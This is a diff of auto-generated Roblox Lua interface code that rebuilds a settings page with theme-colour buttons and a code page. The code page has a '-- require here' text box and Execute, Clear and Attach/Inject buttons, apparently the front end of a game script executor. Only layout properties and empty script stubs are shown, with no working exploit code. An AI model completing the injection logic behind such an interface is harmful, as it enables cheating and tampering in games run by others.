-G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);
+G2L["84"] = Instance.new("LocalScript", G2L["83"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["a1"] = Instance.new("UIStroke", G2L["9f"]);
+G2L["85"] = Instance.new("UIStroke", G2L["83"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["a2"] = Instance.new("UIStroke", G2L["9f"]);
-G2L["a2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["86"] = Instance.new("UIStroke", G2L["83"]);
+G2L["86"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page5
-G2L["a3"] = Instance.new("Frame", G2L["3"]);
-G2L["a3"]["Visible"] = false;
-G2L["a3"]["BorderSizePixel"] = 0;
-G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
-G2L["a3"]["Size"] = UDim2.new(0, 361, 0, 260);
-G2L["a3"]["Position"] = UDim2.new(0.10565, 0, 0.12162, 0);
-G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a3"]["Name"] = [[page5]];
-G2L["a3"]["BackgroundTransparency"] = 0.5;
+G2L["87"] = Instance.new("Frame", G2L["3"]);
+G2L["87"]["Visible"] = false;
+G2L["87"]["BorderSizePixel"] = 0;
+G2L["87"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["87"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["87"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
+G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["87"]["Name"] = [[page5]];
+G2L["87"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextLabel
-G2L["a4"] = Instance.new("TextLabel", G2L["a3"]);
-G2L["a4"]["TextWrapped"] = true;
-G2L["a4"]["BorderSizePixel"] = 0;
-G2L["a4"]["TextSize"] = 14;
-G2L["a4"]["TextScaled"] = true;
-G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a4"]["BackgroundTransparency"] = 1;
-G2L["a4"]["Size"] = UDim2.new(0, 200, 0, 25);
-G2L["a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a4"]["Text"] = [[Settings]];
-G2L["a4"]["Position"] = UDim2.new(0.22161, 0, 0, 0);
+G2L["88"] = Instance.new("TextLabel", G2L["87"]);
+G2L["88"]["TextWrapped"] = true;
+G2L["88"]["BorderSizePixel"] = 0;
+G2L["88"]["TextSize"] = 14;
+G2L["88"]["TextScaled"] = true;
+G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["88"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["88"]["BackgroundTransparency"] = 1;
+G2L["88"]["Size"] = UDim2.new(0, 200, 0, 25);
+G2L["88"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["88"]["Text"] = [[Settings]];
+G2L["88"]["Position"] = UDim2.new(0.22161, 0, 0, 0);
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextLabel.UIStroke
-G2L["a5"] = Instance.new("UIStroke", G2L["a4"]);
+G2L["89"] = Instance.new("UIStroke", G2L["88"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextLabel
-G2L["a6"] = Instance.new("TextLabel", G2L["a3"]);
-G2L["a6"]["TextWrapped"] = true;
-G2L["a6"]["BorderSizePixel"] = 0;
-G2L["a6"]["TextSize"] = 14;
-G2L["a6"]["TextScaled"] = true;
-G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["a6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a6"]["BackgroundTransparency"] = 1;
-G2L["a6"]["Size"] = UDim2.new(0, 120, 0, 25);
-G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a6"]["Text"] = [[Theme color]];
-G2L["a6"]["Position"] = UDim2.new(0, 0, 0.13077, 0);
+G2L["8a"] = Instance.new("TextLabel", G2L["87"]);
+G2L["8a"]["TextWrapped"] = true;
+G2L["8a"]["BorderSizePixel"] = 0;
+G2L["8a"]["TextSize"] = 14;
+G2L["8a"]["TextScaled"] = true;
+G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8a"]["BackgroundTransparency"] = 1;
+G2L["8a"]["Size"] = UDim2.new(0, 120, 0, 25);
+G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8a"]["Text"] = [[Theme color]];
+G2L["8a"]["Position"] = UDim2.new(0, 0, 0.13077, 0);
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextLabel.UIStroke
-G2L["a7"] = Instance.new("UIStroke", G2L["a6"]);
+G2L["8b"] = Instance.new("UIStroke", G2L["8a"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextLabel.UIStroke
-G2L["a8"] = Instance.new("UIStroke", G2L["a6"]);
-G2L["a8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["8c"] = Instance.new("UIStroke", G2L["8a"]);
+G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextButton
-G2L["a9"] = Instance.new("TextButton", G2L["a3"]);
-G2L["a9"]["BorderSizePixel"] = 0;
-G2L["a9"]["TextSize"] = 14;
-G2L["a9"]["TextColor3"] = Color3.fromRGB(76, 76, 76);
-G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
-G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["a9"]["BackgroundTransparency"] = 1;
-G2L["a9"]["Size"] = UDim2.new(0, 90, 0, 25);
-G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a9"]["Text"] = [[Default]];
-G2L["a9"]["Position"] = UDim2.new(0.33241, 0, 0.13077, 0);
-
-
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
-G2L["aa"] = Instance.new("UIStroke", G2L["a9"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
-G2L["ab"] = Instance.new("UIStroke", G2L["a9"]);
-G2L["ab"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["8d"] = Instance.new("TextButton", G2L["87"]);
+G2L["8d"]["BorderSizePixel"] = 0;
+G2L["8d"]["TextSize"] = 14;
+G2L["8d"]["TextColor3"] = Color3.fromRGB(76, 76, 76);
+G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8d"]["BackgroundTransparency"] = 1;
+G2L["8d"]["Size"] = UDim2.new(0, 90, 0, 25);
+G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8d"]["Text"] = [[Default]];
+G2L["8d"]["Position"] = UDim2.new(0.33241, 0, 0.13077, 0);
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-G2L["ac"] = Instance.new("LocalScript", G2L["a9"]);
+G2L["8e"] = Instance.new("LocalScript", G2L["8d"]);
 
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["8f"] = Instance.new("UIStroke", G2L["8d"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["90"] = Instance.new("UIStroke", G2L["8d"]);
+G2L["90"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page5.TextButton
-G2L["ad"] = Instance.new("TextButton", G2L["a3"]);
+G2L["91"] = Instance.new("TextButton", G2L["87"]);
+G2L["91"]["BorderSizePixel"] = 0;
+G2L["91"]["TextSize"] = 14;
+G2L["91"]["TextColor3"] = Color3.fromRGB(171, 0, 0);
+G2L["91"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["91"]["BackgroundTransparency"] = 1;
+G2L["91"]["Size"] = UDim2.new(0, 90, 0, 25);
+G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["91"]["Text"] = [[Red]];
+G2L["91"]["Position"] = UDim2.new(0.58172, 0, 0.13077, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+G2L["92"] = Instance.new("LocalScript", G2L["91"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["93"] = Instance.new("UIStroke", G2L["91"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["94"] = Instance.new("UIStroke", G2L["91"]);
+G2L["94"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton
+G2L["95"] = Instance.new("TextButton", G2L["87"]);
+G2L["95"]["BorderSizePixel"] = 0;
+G2L["95"]["TextSize"] = 14;
+G2L["95"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["95"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["95"]["BackgroundTransparency"] = 1;
+G2L["95"]["Size"] = UDim2.new(0, 61, 0, 25);
+G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["95"]["Text"] = [[Blue]];
+G2L["95"]["Position"] = UDim2.new(0.83102, 0, 0.13077, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+G2L["96"] = Instance.new("LocalScript", G2L["95"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["97"] = Instance.new("UIStroke", G2L["95"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["98"] = Instance.new("UIStroke", G2L["95"]);
+G2L["98"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton
+G2L["99"] = Instance.new("TextButton", G2L["87"]);
+G2L["99"]["BorderSizePixel"] = 0;
+G2L["99"]["TextSize"] = 14;
+G2L["99"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["99"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["99"]["BackgroundTransparency"] = 1;
+G2L["99"]["Size"] = UDim2.new(0, 61, 0, 25);
+G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["99"]["Text"] = [[Green]];
+G2L["99"]["Position"] = UDim2.new(0, 0, 0.23462, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+G2L["9a"] = Instance.new("LocalScript", G2L["99"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["9b"] = Instance.new("UIStroke", G2L["99"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["9c"] = Instance.new("UIStroke", G2L["99"]);
+G2L["9c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton
+G2L["9d"] = Instance.new("TextButton", G2L["87"]);
+G2L["9d"]["BorderSizePixel"] = 0;
+G2L["9d"]["TextSize"] = 14;
+G2L["9d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9d"]["BackgroundTransparency"] = 1;
+G2L["9d"]["Size"] = UDim2.new(0, 59, 0, 25);
+G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9d"]["Text"] = [[White]];
+G2L["9d"]["Position"] = UDim2.new(0.16898, 0, 0.23462, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+G2L["9e"] = Instance.new("LocalScript", G2L["9d"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["9f"] = Instance.new("UIStroke", G2L["9d"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["a0"] = Instance.new("UIStroke", G2L["9d"]);
+G2L["a0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton
+G2L["a1"] = Instance.new("TextButton", G2L["87"]);
+G2L["a1"]["BorderSizePixel"] = 0;
+G2L["a1"]["TextSize"] = 14;
+G2L["a1"]["TextColor3"] = Color3.fromRGB(171, 0, 255);
+G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a1"]["BackgroundTransparency"] = 1;
+G2L["a1"]["Size"] = UDim2.new(0, 90, 0, 25);
+G2L["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a1"]["Text"] = [[Purple]];
+G2L["a1"]["Position"] = UDim2.new(0.33241, 0, 0.23462, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
+G2L["a2"] = Instance.new("LocalScript", G2L["a1"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["a3"] = Instance.new("UIStroke", G2L["a1"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+G2L["a4"] = Instance.new("UIStroke", G2L["a1"]);
+G2L["a4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["a5"] = Instance.new("ImageButton", G2L["3"]);
+-- [ERROR] cannot convert HoverImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["a5"]["BorderSizePixel"] = 0;
+G2L["a5"]["BackgroundTransparency"] = 1;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a5"]["Image"] = [[rbxassetid://484211948]];
+G2L["a5"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["a5"]["HoverImage"] = [[rbxassetid://%lld]];
+G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a5"]["Position"] = UDim2.new(0, 0, 0.7027, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["a6"] = Instance.new("LocalScript", G2L["a5"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
+G2L["a7"] = Instance.new("UIStroke", G2L["a5"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
+G2L["a8"] = Instance.new("UIStroke", G2L["a5"]);
+G2L["a8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page2
+G2L["a9"] = Instance.new("Frame", G2L["3"]);
+G2L["a9"]["Visible"] = false;
+G2L["a9"]["BorderSizePixel"] = 0;
+G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["a9"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["a9"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
+G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a9"]["Name"] = [[page2]];
+G2L["a9"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.ScreenGui.Frame.page2.Text
+G2L["aa"] = Instance.new("ScrollingFrame", G2L["a9"]);
+G2L["aa"]["Active"] = true;
+G2L["aa"]["BorderSizePixel"] = 0;
+G2L["aa"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
+G2L["aa"]["Name"] = [[Text]];
+G2L["aa"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
+G2L["aa"]["Size"] = UDim2.new(1, 0, 0.83077, 0);
+G2L["aa"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["aa"]["ScrollBarThickness"] = 2;
+G2L["aa"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
+G2L["ab"] = Instance.new("LocalScript", G2L["aa"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page2.Text.UIStroke
+G2L["ac"] = Instance.new("UIStroke", G2L["aa"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel
+G2L["ad"] = Instance.new("TextLabel", G2L["aa"]);
+G2L["ad"]["LineHeight"] = 1.01;
 G2L["ad"]["BorderSizePixel"] = 0;
 G2L["ad"]["TextSize"] = 14;
-G2L["ad"]["TextColor3"] = Color3.fromRGB(171, 0, 0);
-G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["ad"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
 G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ad"]["TextColor3"] = Color3.fromRGB(191, 191, 191);
 G2L["ad"]["BackgroundTransparency"] = 1;
-G2L["ad"]["Size"] = UDim2.new(0, 90, 0, 25);
+G2L["ad"]["Size"] = UDim2.new(0, 28, 0, 216);
 G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ad"]["Text"] = [[Red]];
-G2L["ad"]["Position"] = UDim2.new(0.58172, 0, 0.13077, 0);
+G2L["ad"]["Text"] = [[1]];
+G2L["ad"]["AutomaticSize"] = Enum.AutomaticSize.Y;
+G2L["ad"]["Position"] = UDim2.new(0, 0, -0.00477, 0);
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.y
 G2L["ae"] = Instance.new("UIStroke", G2L["ad"]);
+G2L["ae"]["Name"] = [[y]];
 
 
-
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.UIStroke
 G2L["af"] = Instance.new("UIStroke", G2L["ad"]);
 G2L["af"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-G2L["b0"] = Instance.new("LocalScript", G2L["ad"]);
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox
+G2L["b0"] = Instance.new("TextBox", G2L["aa"]);
+G2L["b0"]["LineHeight"] = 1.01;
+G2L["b0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["b0"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b0"]["BorderSizePixel"] = 0;
+G2L["b0"]["TextSize"] = 14;
+G2L["b0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b0"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(101, 101, 101);
+G2L["b0"]["RichText"] = true;
+G2L["b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b0"]["AutomaticSize"] = Enum.AutomaticSize.Y;
+G2L["b0"]["MultiLine"] = true;
+G2L["b0"]["ClearTextOnFocus"] = false;
+G2L["b0"]["PlaceholderText"] = [[-- require here]];
+G2L["b0"]["Size"] = UDim2.new(0, 332, 0, 216);
+G2L["b0"]["Position"] = UDim2.new(0.07756, 0, -0.00477, 0);
+G2L["b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b0"]["Text"] = [[]];
+G2L["b0"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
+G2L["b1"] = Instance.new("LocalScript", G2L["b0"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton
-G2L["b1"] = Instance.new("TextButton", G2L["a3"]);
-G2L["b1"]["BorderSizePixel"] = 0;
-G2L["b1"]["TextSize"] = 14;
-G2L["b1"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
-G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
-G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["b1"]["BackgroundTransparency"] = 1;
-G2L["b1"]["Size"] = UDim2.new(0, 61, 0, 25);
-G2L["b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b1"]["Text"] = [[Blue]];
-G2L["b1"]["Position"] = UDim2.new(0.83102, 0, 0.13077, 0);
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
+G2L["b2"] = Instance.new("LocalScript", G2L["b0"]);
+G2L["b2"]["Name"] = [[Completor]];
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
-G2L["b2"] = Instance.new("UIStroke", G2L["b1"]);
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
+G2L["b3"] = Instance.new("LocalScript", G2L["b0"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
-G2L["b3"] = Instance.new("UIStroke", G2L["b1"]);
-G2L["b3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.UIStroke
+G2L["b4"] = Instance.new("UIStroke", G2L["b0"]);
+G2L["b4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["b4"]["Thickness"] = 2;
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-G2L["b4"] = Instance.new("LocalScript", G2L["b1"]);
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.y
+G2L["b5"] = Instance.new("UIStroke", G2L["b0"]);
+G2L["b5"]["Name"] = [[y]];
 
 
-
--- StarterGui.ScreenGui.Frame.page5.TextButton
-G2L["b5"] = Instance.new("TextButton", G2L["a3"]);
-G2L["b5"]["BorderSizePixel"] = 0;
-G2L["b5"]["TextSize"] = 14;
-G2L["b5"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
-G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
-G2L["b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["b5"]["BackgroundTransparency"] = 1;
-G2L["b5"]["Size"] = UDim2.new(0, 61, 0, 25);
-G2L["b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b5"]["Text"] = [[Green]];
-G2L["b5"]["Position"] = UDim2.new(0, 0, 0.23462, 0);
-
-
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
-G2L["b6"] = Instance.new("UIStroke", G2L["b5"]);
+-- StarterGui.ScreenGui.Frame.page2.Execute
+G2L["b6"] = Instance.new("TextButton", G2L["a9"]);
+G2L["b6"]["TextWrapped"] = true;
+G2L["b6"]["BorderSizePixel"] = 0;
+G2L["b6"]["TextSize"] = 14;
+G2L["b6"]["TextScaled"] = true;
+G2L["b6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b6"]["BackgroundTransparency"] = 1;
+G2L["b6"]["Size"] = UDim2.new(0, 89, 0, 41);
+G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b6"]["Text"] = [[Execute]];
+G2L["b6"]["Name"] = [[Execute]];
+G2L["b6"]["Position"] = UDim2.new(0, 0, 0.83846, 0);
 
 
-
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
-G2L["b7"] = Instance.new("UIStroke", G2L["b5"]);
-G2L["b7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-G2L["b8"] = Instance.new("LocalScript", G2L["b5"]);
+-- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
+G2L["b7"] = Instance.new("UIStroke", G2L["b6"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton
-G2L["b9"] = Instance.new("TextButton", G2L["a3"]);
+-- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
+G2L["b8"] = Instance.new("UIStroke", G2L["b6"]);
+G2L["b8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["b8"]["Thickness"] = 2;
+
+
+-- StarterGui.ScreenGui.Frame.page2.Clear
+G2L["b9"] = Instance.new("TextButton", G2L["a9"]);
+G2L["b9"]["TextWrapped"] = true;
 G2L["b9"]["BorderSizePixel"] = 0;
 G2L["b9"]["TextSize"] = 14;
+G2L["b9"]["TextScaled"] = true;
 G2L["b9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
+G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["b9"]["BackgroundTransparency"] = 1;
-G2L["b9"]["Size"] = UDim2.new(0, 59, 0, 25);
+G2L["b9"]["Size"] = UDim2.new(0, 94, 0, 41);
 G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b9"]["Text"] = [[White]];
-G2L["b9"]["Position"] = UDim2.new(0.16898, 0, 0.23462, 0);
+G2L["b9"]["Text"] = [[Clear]];
+G2L["b9"]["Name"] = [[Clear]];
+G2L["b9"]["Position"] = UDim2.new(0.24654, 0, 0.83846, 0);
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
 G2L["ba"] = Instance.new("UIStroke", G2L["b9"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
 G2L["bb"] = Instance.new("UIStroke", G2L["b9"]);
 G2L["bb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["bb"]["Thickness"] = 2;
 
 
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-G2L["bc"] = Instance.new("LocalScript", G2L["b9"]);
+-- StarterGui.ScreenGui.Frame.page2.Inject
+G2L["bc"] = Instance.new("TextButton", G2L["a9"]);
+G2L["bc"]["TextWrapped"] = true;
+G2L["bc"]["BorderSizePixel"] = 0;
+G2L["bc"]["TextSize"] = 14;
+G2L["bc"]["TextScaled"] = true;
+G2L["bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bc"]["BackgroundTransparency"] = 1;
+G2L["bc"]["Size"] = UDim2.new(0, 75, 0, 41);
+G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bc"]["Text"] = [[Attach]];
+G2L["bc"]["Name"] = [[Inject]];
+G2L["bc"]["Position"] = UDim2.new(0.50693, 0, 0.83846, 0);
 
 
-
--- StarterGui.ScreenGui.Frame.ImageButton
